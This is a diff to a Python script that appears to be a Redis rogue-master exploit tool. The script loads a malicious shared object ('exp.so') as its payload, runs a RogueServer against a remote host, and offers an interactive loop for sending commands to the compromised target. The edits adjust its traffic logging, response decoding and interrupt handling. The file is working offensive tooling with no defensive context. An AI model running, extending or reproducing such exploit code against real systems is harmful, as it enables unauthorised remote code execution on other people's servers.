@@ -6,6 +6,7 @@ from optparse import OptionParser
 
 payload = open("exp.so", "rb").read()
 CLRF = "\r\n"
+IN_OUT = True
 
 def mk_cmd_arr(arr):
     cmd = ""
@@ -29,20 +30,23 @@ def decode_cmd(cmd):
 
 def din(sock, cnt):
     msg = sock.recv(cnt)
-    if len(msg) < 300:
-        print(f"\033[1;34;40m[->]\033[0m {msg}")
-    else:
-        print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
-    return msg.decode()
+    if IN_OUT:
+        if len(msg) < 300:
+            print(f"\033[1;34;40m[->]\033[0m {msg}")
+        else:
+            print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
+
+    return msg.decode('gb18030')
 
 def dout(sock, msg):
     if type(msg) != bytes:
         msg = msg.encode()
     sock.send(msg)
-    if len(msg) < 300:
-        print(f"\033[1;32;40m[<-]\033[0m {msg}")
-    else:
-        print(f"\033[1;32;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")
+    if IN_OUT:
+        if len(msg) < 300:
+            print(f"\033[1;32;40m[<-]\033[0m {msg}")
+        else:
+            print(f"\033[1;32;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")
 
 def decode_shell_result(s):
     return "\n".join(s.split("\r\n")[1:-1])
@@ -108,7 +112,9 @@ class RogueServer:
                 break
 
 def interact(remote):
+    global IN_OUT
     try:
+        IN_OUT = False
         while True:
             cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
             if cmd == "exit":
@@ -118,7 +124,9 @@ def interact(remote):
                 if l:
                     print("\033[1;34;40m[>>]\033[0m " + l)
     except KeyboardInterrupt:
-        return
+        pass
+    finally:
+        IN_OUT = True
 
 def runserver(rhost, rport, lhost, lport):
     # expolit
